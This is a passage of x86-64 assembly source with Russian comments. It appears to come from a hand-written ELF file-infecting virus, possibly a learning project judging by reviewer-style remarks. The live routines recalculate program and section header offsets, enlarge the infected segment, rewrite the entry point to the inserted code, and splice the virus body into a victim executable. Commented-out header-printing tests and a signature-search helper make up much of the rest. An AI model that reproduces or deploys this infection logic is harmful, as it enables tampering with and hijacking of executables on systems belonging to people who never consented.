    leaq  victim_code_before_infect_point_size(%rip), %rbx
    mov   %rax, (%rbx)       # save size

    //  посчитать размер кода от точки заражения
    //  до конца эльфа
    leaq  victim_elf_addr(%rip), %rbx
    mov   (%rbx), %rdi

    add   %rax, %rdi        # addr точки заражения в памяти

    leaq  victim_shdr_table_addr(%rip), %rbx
    mov   (%rbx), %rcx

    leaq  victim_shdr_table_size(%rip), %rbx
    mov   (%rbx), %rsi
    add    %rcx, %rsi       # shdr end ptr

    sub   %rdi, %rsi        # code sz fom inf. point to
                            # end of shdr table

    leaq  victim_code_after_infect_point_addr(%rip), %rbx
    mov   %rdi, (%rbx)                                      # save addr

    leaq  victim_code_after_infect_point_size(%rip), %rbx
    mov   %rsi, (%rbx)                                      # save size

    // params for _phdr_offset_and_addr_recount
    leaq  virus_code_size(%rip), %rbx
    mov   (%rbx), %rcx

    leaq  infected_seg_end_vaddr(%rip), %rbx
    mov   (%rbx), %rdx

   leaq  infected_seg_phdr_addr(%rip), %rbx
    mov   (%rbx), %rdi
    mov   PHDR_P_OFFSET(%rdi), %r8

    leaq  infected_seg_phdr_addr(%rip), %rbx
    mov   (%rbx), %rdi
    mov   PHDR_P_FILESZ(%rdi), %rax
    add   %rax, %r8

    leaq  victim_phdr_amount(%rip), %rbx
    mov   (%rbx), %rsi

    leaq  victim_phdr_table_addr(%rip), %rbx
    mov   (%rbx), %rdi

    // изменить поля p_offset, p_vaddr, p_paddr во всех
    // phdr, которые описывают на сегменты, находящиеся
    // НИЖЕ точки заражения
    call   _phdr_offset_and_addr_recount

     // params for _add_size_to_phdr
    leaq  virus_code_size(%rip), %rbx
    mov   (%rbx), %rsi

    leaq  infected_seg_phdr_addr(%rip), %rbx
    mov   (%rbx), %rdi

    // увеличить поля p_filesz и p_memsz на размер
    // вируса - т.е. расширить сзаражаемый егмент
    call  _add_size_to_phdr

    // увелчиивает поле e_shof в заголовке эльфа
    // - смещение до табл. загл. секций
    leaq  virus_code_size(%rip), %rbx
    mov   (%rbx), %rsi

    // пробуем изменить e_entry и e_shoff
    leaq  victim_elf_addr(%rip), %rbx
    mov   (%rbx), %rdi

    leaq  infected_seg_end_vaddr(%rip), %rbx
    mov   (%rbx), %rdx

    add   $0x18, %rdi    # смещение до e_entry
    mov   %rdx, (%rdi)

    // add   $0x28, %rdi   # смещение до e_shoff
    add   $0x10, %rdi   # смещение до e_shoff
    add   %rsi, (%rdi)

    pop  %rsi
    pop  %rdi
    pop  %rcx
    pop  %rdx
    pop  %rbx
    pop  %rax

    ret

// _RECOMBINE_ELF
// Вписывает вирус и код жертвы в заданный файл
// PARAMS
// RDI - test infecion file name
_recombine_elf:

    mov     $O_RDWR_AND_O_APPEND,  %rsi
    mov     $0x2, %rax  # fopen syscall
    syscall
    test    %rax, %rax
    jl      _openfile_neg_fd_error

    leaq    fd(%rip), %rbx
    mov     %rax, (%rbx)   # save fd


    // записать файл жертвы от начала до точки заражения:
    // заголовок эльфа, заголовки программ и весь код до
    // конца зараж. сегм. кода
    leaq     victim_code_before_infect_point_size(%rip), %rbx
    mov     (%rbx), %rdx

    leaq    victim_elf_addr(%rip), %rbx
    mov     (%rbx), %rsi

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    # в rcx можно указать смещение, откуда начать запись
    # но если файл открыт на o_append,
    # этот аргумент игнорируется
    mov     $0x12, %rax   # syscall pwrite
    syscall


    // записать в файл код вируса
    leaq    virus_code_addr(%rip), %rbx #0x7ffff7ff20e8
    mov     (%rbx), %rsi

    leaq    virus_code_size(%rip), %rbx  # 0x4cb8
    mov     (%rbx), %rdx

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    mov     $0x12, %rax      # syscall pwrite
    syscall

    // записать в файл код жертвы от точки заражения
    // до конца: код + заголовки секций
    leaq  victim_code_after_infect_point_addr(%rip), %rbx # 0x7ffff7ff77bc
    mov   (%rbx), %rsi

    leaq  victim_code_after_infect_point_size(%rip), %rbx  # 0x20f0
    mov   (%rbx), %rdx

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    mov     $0x12, %rax      # syscall pwrite
    syscall

    ret


/// NB!: Без сигнатуры можно обойтись (см ранее).
// Но раз нет сигнатуры, тогда нам нужно как-то
// отличать зараженный файл от чистого - подумай
// об этом. Побайтово проверяет содержимое по заданному
// указателю, пока не найдет сигнатуру. Если нашел -
// возвращает адрес, по которому она расположена, в
// противном случае возвращает 0
//
// PARAMS
// RDI - указатель на обзец
// RSI - code ptr,в котором следует искать сигнатуру
// RDX - размер образца
// RCX - размер этого кода в байтах
// _find_signature:
//     push    %rbx
//     push    %r8

//     xor     %r8, %r8  # счетчик совпавших символов
// _find_signature_cycle:

//     movzwl   (%rsi), %eax # сравнить содержимое указателей
//     movzwl   %ax, %eax

//     movzwl   (%rdi), %ebx
//     movzwl  %bx, %ebx

//     cmp     %al, %bl
//     jne     _mismatch_example

//     cmp     %rdx, %r8  # счетчик совпадений = длине образца?
//     je      _find_signature_success

//     inc     %r8   # +1 совпавший символ
//     inc     %rdi  # передвинули указатели строки
//     inc     %rsi  # и примера на след. символы

//     jmp     _find_signature_continue_cycle

// _mismatch_example:

//     inc     %rsi
//     sub     %r8, %rdi  # передвинули ptr образца на его начало
//     xor     %r8, %r8

// _find_signature_continue_cycle:
//     loop    find_virus_signature_cycle

// _find_signature_fail:
//     xor     %rax, %rax
//     jmp     find_virus_signature_exit

// _find_signature_success:
//     sub     %rdx, %rsi  # возвращаем указатель на начало
//     mov     %rdi, %rax  # совпавшей строки

// _find_virus_signature_exit:
//     pop     %r8
//     pop     %rbx

//     ret

// test_find_virus_signature:
//     push    %rbp
//     mov     %rsp, %rbp

//     mov     $virus_file_name, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    _openfile

//     mov     %rax, %rsi
//     mov     $0x0, %rdi
//     mov     $0x10, %rdx
//     mov     $0x0, %r8
//     call	my_printf

//     mov     %rax, %rdi
//     mov     $0x4c70, %rsi

//     call    find_virus_signature

//     mov     %rax, %rsi
//     mov     $0x0, %rdi
//     mov     $0x10, %rdx
//     mov     $0x0, %r8
//     call	my_printf

//     pop     %rbp
//     ret

/* READ_ELF_HEADER
    # читает заголовок эльфа из памяти

    * @PARAMS
    * %RDI - dest
    * %RSI - src - укаатель на память, где лежит эльф файл

    */

//     .globl  _read_elf_header
// 	.type	_read_elf_header, @function

// _read_elf_header:
//     push    %rbx
//     push    %rcx

//     mov     $0x1, %rdx
//     mov     $0x40, %rcx  # elfhdr sz

//     call    my_fread

//     pop     %rdx
//     pop     %rcx

//     ret

    // TEST READ_ELF_HEADER

    // цель теста: открыть заданный эльф, смаппить его в память,
    // прочитать из памяти его заголовок и вывести его в stdout

// test_elf_hdr_buf:
//     .space 64, 0

// test_elf_file:
//     .string "ex"

// test_elf_file_err_msg:
//     .string "ERR: read elf header \n"
//     .set len_test_elf_file_err_msg, . - test_elf_file_err_msg

// test_read_elf_header:
//     lea     test_elf_file(%rip), %rdi
//     mov 	$O_RDONLY,  %rsi
//     // O_RDWR %rsi
//     call    _openfile

//     cmp     $0, %rax
//     jle     test_read_elf_header_exit

//     mov     %rax, %rsi                    # src ptr

//     lea     test_elf_hdr_buf(%rip), %rdi  # dest ptr
//     call    read_elf_header

//     lea     test_elf_hdr_buf(%rip), %rdi
//     call    print_elf_header

//     jmp     test_read_elf_header_exit

// test_read_elf_header_error:
//     lea     test_elf_file_err_msg(%rip), %rsi
// 	mov     len_test_elf_file_err_msg, %rdx
// 	call    _my_write

// test_read_elf_header_exit:
//     ret

//     # читает заголовок пргграммы из памяти
//     # в rsi принимает указатель на память, в которой лежит эльф, смещенный до начала
//     # таблицы заголовков программы, в rdi - указатель на место под записья
// program_header:
//     .space 0x38,0

//     .globl  read_program_header
// 	.type	read_program_header, @function

// read_program_header:
//     push %rbx
//     push %rdx

//     mov  $0x1, %rdx
//     mov  $0x38, %rbx

//     call fread

//     pop  %rdx
//     pop  %rbx

//     ret

//     # принимает в edi указатель на структуру заголовка программы и выводит его поля

//     .globl  print_program_header
// 	.type	print_program_header, @function

// print_program_header:

//     push    %rsi
//     push    %rdx
//     push    %rcx
//     push    %r8

//     mov     %rdi, %rcx

// 	movl	(%rcx), %esi
//     mov     $p_type_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xE, %r8
//     call	my_printf

//     add     $0x4, %rcx

//     movl	(%rcx), %esi
//     mov     $p_flags_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x4, %rcx

//     mov 	(%rcx), %rsi
//     mov     $p_offset_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $p_vaddr_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $p_paddr_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $p_filesz_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $p_memsz_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $p_align_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     pop     %r8
//     pop     %rcx
//     pop     %rdx
//     pop     %rsi

//     ret

// test_read_program_header:

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY, %rsi
//     call    _openfile

//     cmp     $0, %rax

//     jle     test_read_program_header_end

//     mov     %rax, %rdi
//     mov     %rdi,  %rsi

//     mov     ELF_E_PHOFF(%rdi), %rcx
//     add     %rcx, %rsi
//     mov     $program_header, %rdi
//     call    read_program_header

//     mov     $program_header, %rdi
//     call    print_program_header

// test_read_program_header_end:
//     ret

//     # читает все заголовки програм
//     # принимает в rdi адрес, по которому должны быть записаны заголовки
//     # в rsi - адрес, по которому лежат заголвки в памяти
//     # в rdx - количество заголовков
//     .globl  read_all_program_headers
// 	.type	read_all_program_headers, @function

// read_all_program_headers:

//     push    %rbp
//     mov     %rsp, %rbp

//     push    %rcx
//     mov     %rdx, %rcx
// read_all_program_headers_cycle:

//     call    read_program_header

//     loop    read_all_program_headers_cycle
//     pop     %rcx

//     pop     %rbp
//     ret

//     # принимает в rdi aдрес, по которому лежат заголовки
//     # в rsi - их количество

//     .globl  print_all_program_headers
// 	.type	print_all_program_headers, @function

// print_all_program_headers:

//     push    %rbp
//     mov     %rsp, %rbp

//     push    %rcx
//     push    %r8
//     push    %rdx
//     push    %rax

//     mov     %rsi, %rcx

// print_all_program_headers_cycle:

//     mov     %rdi, %rax

//     call    print_program_header

//     mov     $next_str, %rdi
//     mov     $0x0, %rdx
//     mov     $0x1, %r8

//     call    my_printf

//     mov     %rax, %rdi
//     add     $0x38, %rdi

//     loop    print_all_program_headers_cycle

//     pop     %rax
//     pop     %rdx
//     pop     %r8
//     pop     %rcx

//     pop     %rbp
//     ret

// test_read_all_program_headers:
//     push    %rbp
//     mov     %rsp, %rbp

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    _openfile

//     cmp     $0, %rax
//     jle     test_read_all_program_headers_end

//     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
//     mov     %rax, %rsi

//     mov     ELF_E_PHOFF (%rdi), %rcx
//     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

//     mov ELF_E_PHNUM( %rax, %rcx  # считаем, сколько места занимают все заголовки
//     movl    (%rax), %ecx
//     movzwl  %cx, %ecx

//     mov     %rcx, %rdx

//     mov     $0x38, %rax
//     imul     %rcx,  %rax

//     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
//     sub     %rax,  %rsp

//     lea     (%rsp),  %rdi

//     call    read_all_program_headers

//     lea     (%rsp),  %rdi
//     mov     %rcx, %rsi

//     call    print_all_program_headers
//     add     %rax,  %rsp

// test_read_all_program_headers_end:
//     pop %rbp
//     ret

// _SHDR_OFFSET_AND_ADDR_RECOUNT
// пересчитывает смещения и адреса секций, которые будут
// находиться после точки заражения
// (см. комменты для _phdr_offset_and_addr_recount)
// PARAMS
// RDI  указатель на заголовки,
// RSI - их количество,
// RDX - Смещение,
// RCX - сколько байт занимает вирус
// R8  - смещеие точки инфицирования
    .globl  _shdr_offset_and_addr_recount
    .type	_shdr_offset_and_addr_recount, @function

_shdr_offset_and_addr_recount:

    push  %r9

    mov   %rcx, %r9
    mov   %rsi, %rcx        # установили счетчик цикла

_shdr_offset_and_addr_recount_cycle:

    add   $0x4, %rdi        # проверяем тип
    cmp   $0x4, (%rdi)      # тип rel?

    jne   _recount_shdr

    push  %rdi              # отредаетировать секцию rel
    push  %rsi
    push  %rdx
    push  %rcx
    push  %r8

    add   $0x14, %rdi
    mov   (%rdi), %r8   # sh_offset

    add   $0x8, %rdi
    mov   (%rdi), %rcx   # sh_size

    mov   %r8, %rdi

    leaq  infected_seg_end_vaddr(%rip), %rsi
    mov   (%rsi), %rsi
    mov   %r9, %rdx      # virus code size

    call  _recount_rel_section

    pop   %r8
    pop   %rcx
    pop   %rdx
    pop   %rsi
    pop   %rdi

_recount_shdr:
    add   $0xC, %rdi       # смещение до поля sh_addr
    cmp   %rdx,  (%rdi)     # sh_addr < addr infection?

    jle   _recount_shdr_offset

    add   %r9, (%rdi)

_recount_shdr_offset:
    add  $0x8, %rdi
    cmp  %r8, (%rdi)

    jle  _next_iter_recount
    add   %r9, (%rdi)       # пересчитываем смещение

_next_iter_recount:          # смещение до след. заголовка
    add   $0x28, %rdi

    loop _shdr_offset_and_addr_recount_cycle
    pop  %r9

    ret

// _PHDR_OFFSET_AND_ADDR_RECOUNT
//    PARAMS
// RDI -  указатель на заголовки,
// RSI -  их количество, в
// RDX -  адрес точки заражения,
// RCX -  сколько байт занимает вирус
// R8  -  смещение точки заражения
// увеличивают поля p_offset в случае, если offset находится НИЖЕ
// точки заражения,и  p_vaddr и p_paddr, если адреса находятся
//  НИЖЕ точки заражения, на размер вируса
//
// Почему нельзя использовать либо смещение, либо адрес?
//  Бывает так, что адрес у сегмента нулевой, а вот смещение - нет.
//  Если ориентироваться только на адрес или только на смещение, можно
//  наткнуться на трудноотлаживаеме ошибки - часть заголовков указывает
//  просто куда-то не туда, в результате хотя весь код вроде как на месте,
// загрузчик его не находит
_phdr_offset_and_addr_recount:

    push  %r9

    mov   %rcx, %r9
    mov   %rsi, %rcx        # установили счетчик цикла

_phdr_offset_and_addr_recount_cycle:

    add   $0x10, %rdi    # проверяем адрес
    cmp   %rdx,  (%rdi)  # is segm
                          # BEFORE infection-point ?
    jle    _recount_offset

    add   %r9, (%rdi)    # recount vaddr and paddr

    add   $0x8, %rdi
    add   %r9, (%rdi)

    sub   $0x8, %rdi
_recount_offset:
    sub   $0x8, %rdi

    cmp   %r8, (%rdi)
    jle   _next_iter_recount_phdr
    add   %r9, (%rdi)

_next_iter_recount_phdr:
    add   $0x30, %rdi
    loop _phdr_offset_and_addr_recount_cycle

    pop  %r9

    ret

//     # читает заголовок секции из памяти
//     # в rsi принимает указатель на память, в которой лежит эльф, смещенный до начала
//     # таблицы заголовков секций, в rdi - указательн на память, куда будет записан
//     # заголовок
// section_header:
//     .space 0x40, 0

//     .globl  read_section_header
// 	.type	read_section_header, @function

// read_section_header:
//     push %rbx
//     push %rdx

//     mov  $0x1, %rdx
//     mov  $0x40, %rbx

//     call fread

//     pop  %rdx
//     pop  %rbx

//     ret
//     # принимает в rdi указатель на структуру заголовка секции
//     # печатает все поля секции
// print_section_header:

//     push    %rsi
//     push    %rdx
//     push    %rcx
//     push    %r8

//     mov     %rdi, %rcx

// 	   movl	(%rcx), %esi
//     mov     $sh_name_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x4, %rcx

//     movl	(%rcx), %esi
//     mov     $sh_type_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x4, %rcx

//     movl	(%rcx), %esi
//     mov     $sh_flags_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $sh_addr_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $sh_offset_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0x11, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $sh_size_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $sh_link_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x4, %rcx

//     mov 	(%rcx), %rsi
//     mov     $sh_info_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x4, %rcx

//     movl 	(%rcx), %esi
//     mov     $sh_addralign_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0x14, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     movl 	(%rcx), %esi
//     mov     $sh_entsize_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0x12, %r8
//     call	my_printf

//     pop     %r8
//     pop     %rcx
//     pop     %rdx
//     pop     %rsi

//     ret
// test_read_section_header:

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    _openfile

//     cmp     $0, %rax

//     jle     test_read_section_header_end

//     mov     %rax, %rdi
//     mov     %rdi,  %rsi

//     mov     ELF_E_SHOFF(%rdi), %rcx
//     add     %rcx, %rsi
//     mov     $section_header, %rdi
//     call    read_section_header

//     mov     $section_header, %rdi
//     call    print_section_header
// test_read_section_header_end:
//     ret

//     # читает все заголовки секций
//     # принимает в rdi адрес, по которому должны быть записаны заголовки
//     # в rsi - адрес, по которому лежат заголвки в памяти
//     # в rdx - количество заголовков
//     .globl  read_all_section_headers
// 	.type	read_all_section_headers, @function

// read_all_section_headers:

//     push    %rbp
//     mov     %rsp, %rbp

//     push    %rcx
//     mov     %rdx, %rcx
// read_all_section_headers_cycle:

//     call    read_section_header

//     loop    read_all_section_headers_cycle
//     pop     %rcx

//     pop     %rbp
//     ret

//     # принимает в rdi aдрес, по которому лежат заголовки
//     # в rsi - их количество

//     .globl  print_all_section_headers
// 	.type	print_all_section_headers, @function

// print_all_section_headers:

//     push    %rbp
//     mov     %rsp, %rbp

//     push    %rcx
//     push    %r8
//     push    %rdx
//     push    %rax

//     mov     %rsi, %rcx

// print_all_section_headers_cycle:

//     mov     %rdi, %rax

//     call    print_section_header

//     mov     $next_str, %rdi
//     mov     $0x0, %rdx
//     mov     $0x1, %r8

//     call    my_printf

//     mov     %rax, %rdi
//     add     $0x40, %rdi

//     loop    print_all_section_headers_cycle

//     pop     %rax
//     pop     %rdx
//     pop     %r8
//     pop     %rcx

//     pop     %rbp
//     ret

// test_read_all_section_headers:
//     push    %rbp
//     mov     %rsp, %rbp

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    _openfile

//     cmp     $0, %rax
//     jle     test_read_all_section_headers_end

//     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
//     mov     %rax, %rsi

//     mov     ELF_E_SHOFF(%rdi), %rcx
//     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

//     mov     ELF_E_SHNUM(%rax), %ecx  # считаем, сколько места занимают все заголовки
//     movzwl  %cx, %ecx

//     mov     %rcx, %rdx

//     mov     $0x40, %rax
//     imul     %rcx,  %rax

//     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
//     sub     %rax,  %rsp

//     lea     (%rsp),  %rdi

//     call    read_all_section_headers

//     lea     (%rsp),  %rdi
//     mov     %rcx, %rsi

//     call    print_all_section_headers
//     add     %rax,  %rsp

// test_read_all_section_headers_end:
//     pop %rbp
//     ret

    // # принимает указатель на структуру заголовка эльфа и выводит все его поля
    // .globl  print_elf_header
	// .type	print_elf_header, @function

//     # принимает в rdi указатель на структуру эльф-хедера
// print_elf_header:
//     push    %rbp
//     mov     %rsp, %rbp

//     push    %rsi
//     push    %rdx
//     push    %rcx
//     push    %r8

//     add     $0x10, %rdi
//     mov     %rdi, %rcx

//     mov     $e_type_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx,  %edx
//     mov     %edx,  %esi
//     mov     $0x10, %rdx
//     mov     $0xf, %r8
//     call    my_printf

//     add     $0x2, %rcx

//     mov     $e_machine_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx,  %edx
//     mov     %edx,  %esi
//     mov     $0x10, %rdx
//     mov     $0x12, %r8
//     call    my_printf

//     add     $0x2, %rcx

//     mov     $e_version_msg, %rdi
//     movzwl  (%rcx), %esi
//     mov     $0x10, %rdx
//     mov     $0x12, %r8
//     call    my_printf

//     add     $0x4, %rcx

//     mov     $e_entry_msg, %rdi
//     movzwl  (%rcx), %esi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call    my_printf

//     add     $0x8, %rcx

//     mov     $e_phoff_msg, %rdi
//     mov     (%rcx), %rsi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call    my_printf

//     add     $0x8, %rcx

//     mov     $e_shoff_msg, %rdi
//     mov     (%rcx), %rsi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call    my_printf

//     add     $0x8, %rcx

//     mov     $e_ehsize_msg, %rdi
//     movl    (%rcx), %esi
//     mov     $0x10, %rdx
//     mov     $0x11, %r8
//     call    my_printf

//     add     $4, %rcx

//     mov     $e_flags_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx, %esi
//     mov     $0x10, %rdx
//     mov     $0xf, %r8
//     call    my_printf

//     add     $2, %rcx

//     mov     $e_phentsize_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx, %esi
//     mov     $0x10, %rdx
//     mov     $0x14, %r8
//     call    my_printf

//     add     $2, %rcx

//     mov     $e_phnum_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx, %esi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call    my_printf

//     add     $2, %rcx

//     mov     $e_shentsize_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx, %esi
//     mov     $0x10, %rdx
//     mov     $0x14, %r8
//     call    my_printf

//     add     $2, %rcx

//     mov     $e_shnum_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx, %esi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call    my_printf

//     add     $2, %rcx

//     mov     $e_shstrndx_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx, %esi
//     mov     $0x10, %rdx
//     mov     $0x13, %r8
//     call    my_printf

//     pop     %r8
//     pop     %rcx
//     pop     %rdx
//     pop     %rsi

//     pop     %rbp
//     ret


/// CNVRT_NUM_TO_HEX_STRING
/// Побайтово конвертирует число в ascii-кода для
/// вывода в шестнадцатеричном формате
/// @PARAMS
/// - %RSI - указатель на массив, в котором лежит число
///
/// Данную функцию можно использовать только после
/// конвертации числа в 16-байтовый массив
/// (см. cnvrt_addr_in_16_byte)
///
/// Если число в текущем байте < 9, оно будет
/// сковертировано в ascii-код цифры, в противном
/// случае число бдет сконвертировано в букву
/// Сконвертированное в аски-коды число записывается
/// в массив converted_addr,
/// в последний байт массива вписывается символ
/// перевода строки для удобства вывода числа в
/// будущем (возможно, перевод строки стоит убрать ?)
converted_addr:
    .space 0x11, 0

    .globl  cnvrt_num_to_hex_string
	.type	cnvrt_num_to_hex_string, @function
cnvrt_num_to_hex_string:
    push    %rax
    push    %rdi
    push    %rcx

    // вписали перевод строки
    lea     converted_addr(%rip), %rdi
    add     $0x10, %rdi
    movb    $0xA,  (%rdi)

    lea     converted_addr(%rip), %rdi
    mov     $0x10, %rcx                  # loop cntr

cnvrt_num_cycle:
    // TAKE CUR. NUM
    xor     %rax, %rax
    movb    (%rsi), %al

    // NUMBER OR LETTER?
    cmp     $0x09, %rax     # число или буква?
    jg      cnvrt_in_letter

    // NUMER
    add     $0x30,  %al # сконвертировать аски-код числа
    jmp     continue_cycle

    // LETTER
cnvrt_in_letter:
    add     $0x57, %al  # сконвертировать аски-код числа

    // WRITE DOWN ASCII-CODE
continue_cycle:
    movb    %al, (%rdi)

    inc     %rsi
    inc     %rdi
    loop    cnvrt_num_cycle

cnvrt_num_end:
    popq    %rcx
    popq    %rdi
    popq    %rax

	ret

// test_cnvrt_num_to_hex_string:

//     pushq   %rbp
// 	movq    %rsp, %rbp

//     mov     $byted_addr, %rdi
//     mov     $0x10, %rsi

//     call    clear_array
//     mov     $byted_addr, %rsi

//     movb    $0x01, (%rsi)

//     call    cnvrt_num_to_hex_string

//     mov     $0x0, %rdi
//     mov     $converted_addr, %rsi
//     mov     $0x11, %rdx
//     call    write

//     popq    %rbp
// 	ret


/// принимает в rdi адрес массив,
/// в rsi - его размер, заполняет массив нулями
/// NB!: А чего сразу в %RCX не принимать?
/// NB!: Зачем здесь пролог и эпилог?
/// NB!: Это делается через repnz stosb,
///      разберись как работают эти команды
clear_array:
    // pushq   %rbp
	// movq    %rsp, %rbp
    push    %rcx
    mov     %rsi, %rcx

clear_array_cycle:
    movb    $0x0, (%rdi)
    inc     %rdi
    loop    clear_array_cycle

clear_array_end:
    pop     %rcx
    // popq    %rbp
	ret

/// MY_PRINTF
/// Отладочный вывод. Может вывести строку, число,
/// или и то, и то.
/// - @PARAMS
/// - RDI - string
/// - RSI - число для вывода
/// - RDX - основание системы счисления, в которой
///         надо вывести число или 0, если вывода
///         числа нет,
/// - r8 - размер строки, если она есть
/// TODO: заменить r8 на rcx
/// NB!: globl, @function ?
// my_printf:
//     push    %rcx
//     push    %rax
//     push    %rdx

//     mov     %rdi, %rcx
//     mov     %rsi, %rax

//     cmp     $0, %rdx
//     je      print_string

//     cmp     $16, %rdx
//     je      cnvrt_hex_num

//     jmp     print_string

// cnvrt_hex_num:
//     mov     $byted_addr, %rdi   # очищаем массив (там могло быть другое число)
//     mov     $0x10, %rsi

//     call    clear_array

//     mov     $converted_addr, %rdi
//     mov     $0x11, %rsi

//     call    clear_array

//     mov     %rax, %rdi               # забираем число
//     call    cnvrt_addr_in_16_byte

//     mov     $byted_addr, %rsi
//     call    cnvrt_num_to_hex_string   # преобразовываем в строку

// print_string:
//     mov     %rcx, %rsi # забрали строку

//     cmp     $0, %rsi
//     je      print_num

//     mov     $0, %rdi

//     mov     %r8, %rdx
//     call    _my_write

// print_num:
//     pop     %rdx      # забрали снование системы счисления
//     cmp     $0, %rdx
//     je      my_printf_end

//     xor     %rdi, %rdi
//     mov     $converted_addr, %rsi
//     mov     $0x11, %rdx

//     call    _my_write

// my_printf_end:
//     pop     %rax
//     pop     %rcx
// 	ret

// test_my_printf1:
//     mov     $msg, %rdi
//     mov     $0x3041d23e2, %rsi
//     mov     $0x10, %rdx
//     mov     $0x13, %r8

//     call    my_printf
// 	ret

// test_my_printf2:
//     mov     $0x0, %rdi
//     mov     $0x3041d23e2, %rsi
//     mov     $0x10, %rdx
//     mov     $0x0, %r8

//     call    my_printf

//     ret

// test_my_printf3:

//     mov     $msg, %rdi
//     mov     $0x0, %rsi
//     mov     $0x0, %rdx
//     mov     $0x13, %r8

//     call    my_printf
// 	ret


/// CNVRT_ADDR_IN_16_BYTE
/// Конвертирует восьмибайтовое число в такое же
/// 16-байтовое, т.е. каждые полбайта
/// занимают байт на выходе. Конвертация начинается
/// с младших разрядов числа.
/// Сконвертированное число записывается в массив
/// byted_addr
///  Конвертация происходит за 16 итераций цикла,
/// на каждой итерации:
/// - на конвертируемое число накладывается маска
/// - полученное число сдвигается вправо на 4 бита
/// столько раз,
///   сколько было итераций цикла, чтоб результат
/// оказался в младших разрядах
/// - результат записывается в следующий доступный
/// байт массива byted_addr
/// - маска сдвигается на 4 бита влево
/// @PARAMS
/// - %RDI - число для конвертирования
/// NB!: Просто посмотри на это:
/// (для sizeof(.) = 16 битов):
/// src:   position: FEDCBA9876543210
///            data: 1011101010111100
///                   /  \   /   \
/// copy 4 times:    /    \ /     \
/// 0011101010111100 1011101010111100 1011101010111100 1011101010111100
/// (.=& 0xF000)     (.=& 0x0F00)     (.=& 0x00F0)     (.=& 0x000F)
/// 0011000000000000 0000101000000000 0000000010110000 0000000000001100
/// (.>> 12)         (.>> 8)          (.>> 4)          (.>> 0)
/// 0000000000000011 0000000000001010 0000000000001011 0000000000001100
/// .+= 0x30 ; if (.>0x39) { .+= 0x57-0x30 }
/// "3"              "A"              "B"              "C"
/// Неужели сложно такое экстраполировать для quad?
/// Нужна всего одна функция, а если надо будет вывести не quad а байт,
/// то никто не мешает обнулить старшие биты... Неужели это так сложно?
/// NB!: globl, @function ?
cnvrt_addr_in_16_byte:
    push    %r8
    push    %r9
    push    %rcx
    push    %rdx
    push    %rbx
    push    %rsi

    // SETUP VALUES
    mov     %rdi, %rdx
    lea     byted_addr(%rip), %rsi

    add     $0xF, %rsi      # начинается с младших
    mov     $0x10, %rcx     # loop cntr

    mov     $0xF, %rbx      # маска для числа

   // CONVERT NUMBER
cnvrt_addr_loop:
    and     %rbx, %rdx      # наложить маску на число

